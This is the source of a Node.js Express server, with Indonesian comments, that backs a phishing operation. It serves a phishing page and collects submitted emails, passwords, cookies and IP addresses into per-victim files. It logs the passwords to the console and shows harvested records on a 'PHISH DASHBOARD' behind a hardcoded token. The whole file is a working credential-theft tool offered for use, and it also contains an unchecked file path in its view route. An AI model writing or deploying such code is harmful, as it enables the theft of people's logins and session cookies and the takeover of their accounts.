const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Serve halaman phishing
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Endpoint buat collect data
app.post('/collect', (req, res) => {
    const data = {
        ...req.body,
        ip: req.headers['x-forwarded-for'] || req.ip,
        time: new Date().toISOString()
    };

    const log = `[${data.time}] ${data.email || 'no-email'} | ${data.ip}\n`;
    fs.appendFileSync('hits.txt', log);

    const safeEmail = (data.email || 'unknown').replace(/[^a-zA-Z0-9]/g, '_');
    const filename = `victims/${safeEmail}_${Date.now()}.json`;
    fs.mkdirSync('victims', { recursive: true });
    fs.writeFileSync(filename, JSON.stringify(data, null, 2));

    console.log(`[+] NEW VICTIM: ${data.email || 'unknown'} from ${data.ip}`);
    if (data.password) console.log(`    PASS: ${data.password}`);
    if (data.cookies) console.log(`    COOKIES: ${data.cookies.substring(0, 100)}...`);

    res.json({ status: 'ok' });
});

// Dashboard
app.get('/dashboard', (req, res) => {
    const token = req.query.token;
    if (token !== 'gantitoken123') return res.status(403).send('Invalid token');
    
    const hits = fs.existsSync('hits.txt') ? fs.readFileSync('hits.txt', 'utf-8').split('\n').filter(Boolean) : [];
    const files = fs.existsSync('victims') ? fs.readdirSync('victims') : [];
    
    res.send(`
        <html><head><title>Phish Dashboard</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #00ff88; padding: 20px; }
            h1 { color: #ff4444; }
            .stat { background: #1a1a1a; padding: 20px; border-radius: 8px; margin: 10px 0; }
            .hit { border-bottom: 1px solid #333; padding: 8px 0; font-size: 14px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
            th { color: #ff4444; }
            .detail-btn { background: #1a73e8; color: white; border: none; padding: 4px 12px; border-radius: 4px; cursor: pointer; text-decoration: none; font-size: 12px; }
            .copy-btn { background: #333; color: #00ff88; border: 1px solid #00ff88; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; margin-left: 4px; }
        </style></head>
        <body>
        <h1>🔥 PHISH DASHBOARD</h1>
        <div class="stat">Total Hits: ${hits.length} | Total Files: ${files.length}</div>
        <h2 style="color:#fff;">Recent Victims</h2>
        <table>
        <tr><th>Email</th><th>Password</th><th>IP</th><th>Time</th><th>Actions</th></tr>
        ${hits.reverse().slice(0, 100).map(h => {
            const match = h.match(/\[(.*?)\] (.*?) \| (.*)/);
            if (!match) return '';
            const [_, time, email, ip] = match;
            const file = files.find(f => f.includes(email.replace(/[^a-zA-Z0-9]/g, '_')));
            return `<tr>
                <td>${email}</td>
                <td>********</td>
                <td>${ip}</td>
                <td>${time}</td>
                <td><a href="/view/${file || ''}" class="detail-btn">View</a></td>
            </tr>`;
        }).join('')}
        </table>
        </body></html>
    `);
});

// View victim detail
app.get('/view/:file', (req, res) => {
    const file = req.params.file;
    const path = `victims/${file}`;
    if (!fs.existsSync(path)) return res.status(404).send('Not found');
    const data = fs.readFileSync(path, 'utf-8');
    res.setHeader('Content-Type', 'application/json');
    res.send(`<html><head><title>Victim Detail</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #fff; padding: 20px; }
        pre { background: #1a1a1a; padding: 20px; border-radius: 8px; overflow-x: auto; }
        .cookie { background: #1a3a1a; border-left: 4px solid #00ff88; padding: 10px; margin: 10px 0; border-radius: 4px; word-break: break-all; }
        h2 { color: #ff4444; }
        .nav { margin-bottom: 20px; }
        .nav a { color: #1a73e8; text-decoration: none; }
    </style></head>
    <body>
    <div class="nav"><a href="/dashboard?token=gantitoken123">← Back</a></div>
    <h2>Victim Details</h2>
    <div class="cookie"><strong>Cookies:</strong><br>${(() => { try { return JSON.parse(data).cookies || 'none'; } catch(e) { return 'none'; } })()}</div>
    <pre>${JSON.stringify(JSON.parse(data), null, 2)}</pre>
    <button class="copy-btn" onclick="navigator.clipboard.writeText(document.querySelector('pre').textContent)">Copy Raw JSON</button>
    </body></html>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`[+] Phish server running on http://0.0.0.0:${PORT}`));
